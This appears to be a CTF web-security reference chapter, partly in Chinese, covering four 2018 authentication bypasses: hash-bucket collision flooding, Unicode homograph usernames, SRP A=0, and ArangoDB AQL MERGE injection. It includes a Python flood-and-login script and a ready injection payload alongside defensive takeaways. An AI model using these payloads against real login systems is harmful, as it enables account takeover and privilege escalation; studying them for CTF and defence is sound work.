# CTF Web - Auth Edge Cases and Protocol Bypasses

2018-era additions: bucket-collision hash auth bypass, Unicode username homograph collision, SRP A=0/A=N bypass, ArangoDB AQL MERGE privilege escalation. For foundational auth/access techniques see auth-bypass-cookies-and-hidden-routes.md. For JWT attacks see auth-jwt.md. For OAuth/OIDC/SAML/CI-CD, see oauth-saml-cors-and-cicd.md.

## 阅读定位

- 本卷是认证方向的 **短补卷**，专门收长尾和历史特殊案例。
- 如果题目还处在普通 auth / cookie / hidden route / NoSQL 级别，不要从这里开始。


## Table of Contents
- [std::unordered_set Bucket Collision Auth Bypass (Hackover 2018)](#stdunordered_set-bucket-collision-auth-bypass-hackover-2018)
- [nodeprep.prepare Homograph Username Collision (HCTF 2018)](#nodeprepprepare-homograph-username-collision-hctf-2018)
- [SRP A=0, A=N Auth Bypass (OTW Advent 2018)](#srp-a0-an-auth-bypass-otw-advent-2018)
- [ArangoDB AQL MERGE Injection for Privilege Escalation (P.W.N. CTF 2018)](#arangodb-aql-merge-injection-for-privilege-escalation-pwn-ctf-2018)

---

## std::unordered_set Bucket Collision Auth Bypass (Hackover 2018)

```cpp
// Vulnerable shape
std::unordered_set<std::string> users;
auto it = users.find(login_key);           // probes at most MAX_LOOKUPS
if (it != users.end()) { /* accepted */ }
```

```python
# Flood registration: every entry collides in root's bucket
import requests
for i in range(1100):
    requests.post("http://target/register",
                  data={"name": f"ro{i:04d}", "password": "ot1"})
# Log in as root with an arbitrary password — loop gives up before compare
requests.post("http://target/login", data={"name": "root", "password": "anything"})
```

**关键结论：** Hash-table implementations that truncate digests into bucket indices expose a second-preimage surface: the attacker only has to match the bucket, not the full hash. When the data structure also has a bounded probe count (DoS guard), flooding the bucket turns an authentication check into an unconditional accept. Any `unordered_map`/`unordered_set` keyed on low-entropy derivations of user input is suspect — watch for `std::hash<std::string>` implementations that reduce to `size_t` via XOR-folding.

**参考：** Hackover CTF 2018 — secure-hash, writeup 11502

---

## nodeprep.prepare Homograph Username Collision (HCTF 2018)

```text
username: \u1D2Cdmin   # ᴬdmin
nodeprep.prepare("ᴬdmin") == "admin"
```

**关键结论：** Any pipeline that (1) normalizes usernames before lookup but (2) stores the pre-normalized form separately is vulnerable. Normalize once at write-time and never accept users whose pre-normalized form collides with an existing row. Libraries to audit: `nodeprep`, `icu.normalize`, `unicodedata.normalize`, `golang.org/x/text/secure/precis`.

**参考：** HCTF 2018 — admin, writeup 12132

---

## SRP A=0, A=N Auth Bypass (OTW Advent 2018)

```text
Client: sends A = 0
Server: computes S = 0
Session key: K = H(0)   # attacker knows this
```

**关键结论：** SRP, DH, and similar group-based protocols need explicit validation that public values are nontrivial. Spec-compliant SRP rejects `A % N == 0`; buggy implementations don't. Same attack works for `A = N, 2N, ...`.

**参考：** OverTheWire Advent Bonanza 2018 — writeup 12750

---

## ArangoDB AQL MERGE Injection for Privilege Escalation (P.W.N. CTF 2018)

```text
username: x' || 1 == 1 LET newitem = MERGE(u, {'role':'admin'}) RETURN newitem //
password: anything
```

**关键结论：** NoSQL databases each have their own injection grammar. AQL's `MERGE` creates a new document inheriting the found record's fields, bypassing any ACL that only checks persistent storage. Always use parameterised bind variables.

**参考：** P.W.N. CTF 2018 — H!pster Startup, writeup 12067
